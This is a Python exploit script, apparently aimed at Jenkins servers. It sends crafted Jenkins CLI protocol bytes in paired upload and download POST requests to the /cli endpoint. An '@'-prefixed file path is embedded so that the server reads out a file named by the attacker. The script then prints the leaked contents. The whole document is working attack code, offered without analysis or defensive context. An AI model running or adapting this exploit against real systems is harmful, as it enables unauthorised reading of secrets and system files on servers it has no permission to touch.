import threading
import http.client
import uuid
import urllib.parse

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
ENDC = '\033[0m'

def format_url(url: str) -> str:
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url
    return url

def send_download_request(target_info, uuid_str):
    try:
        conn = http.client.HTTPConnection(target_info.netloc)
        conn.request(
            "POST",
            "/cli?remoting=false",
            headers={
                "Session": uuid_str,
                "Side": "download"
            }
        )
        response = conn.getresponse().read()
        print(f"{GREEN}RESPONSE from {target_info.netloc}:{ENDC} {response}")
    except Exception as e:
        print(f"{RED}Error in download request:{ENDC} {str(e)}")

def send_upload_request(target_info, uuid_str, data):
    try:
        conn = http.client.HTTPConnection(target_info.netloc)
        conn.request(
            "POST",
            "/cli?remoting=false",
            headers={
                "Session": uuid_str,
                "Side": "upload",
                "Content-type": "application/octet-stream"
            },
            body=data
        )
    except Exception as e:
        print(f"{RED}Error in upload request:{ENDC} {str(e)}")

def launch_exploit(target_url: str, file_path: str):
    formatted_url = format_url(target_url)
    target_info = urllib.parse.urlparse(formatted_url)
    uuid_str = str(uuid.uuid4())

    # Jenkins CLI 프로토콜 헤더+명령 (file_path 포함)
    data = (
            b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@'
            + file_path.encode()
            + b'\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03'
    )

    upload_thread = threading.Thread(target=send_upload_request, args=(target_info, uuid_str, data))
    download_thread = threading.Thread(target=send_download_request, args=(target_info, uuid_str))

    upload_thread.start()
    download_thread.start()

    upload_thread.join()
    download_thread.join()
